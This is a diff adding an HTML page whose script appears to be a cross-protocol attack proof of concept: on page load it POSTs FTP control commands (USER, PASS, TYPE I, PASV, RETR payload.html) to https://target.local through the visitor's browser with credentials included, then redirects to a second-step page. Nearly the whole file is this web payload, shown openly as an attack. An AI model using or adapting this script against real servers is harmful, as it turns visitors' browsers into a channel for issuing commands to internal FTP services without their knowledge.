@@ -1,0 +1,31 @@
+<script>
+  // Step 1: only control commands up to PASV to trigger the data port open
+  const cmds = [
+    'USER bob',
+    'PASS 12345',
+    //'PBSZ 0',
+    //'PROT P',
+    'TYPE I',
+    'PASV',
+    //'LIST',
+    //'NLST payload.html',
+    'RETR payload.html'
+    
+  ].join('\r\n') + '\r\n';
+
+  fetch('https://target.local', {
+    method: 'POST',
+    mode: 'no-cors',
+    headers: { 'Content-Type': 'text/plain' },
+    body: cmds,
+    credentials: 'include'
+  }).catch(() => {});
+
+  // Give the server some seconds to open the passive port
+  setTimeout(function() {
+    // proceed to step 2 (issue RETR)
+    window.location = '/download/ftps-step2.html';
+  }, 5000);
+</script>
+
+<noscript>Enable JavaScript.</noscript>
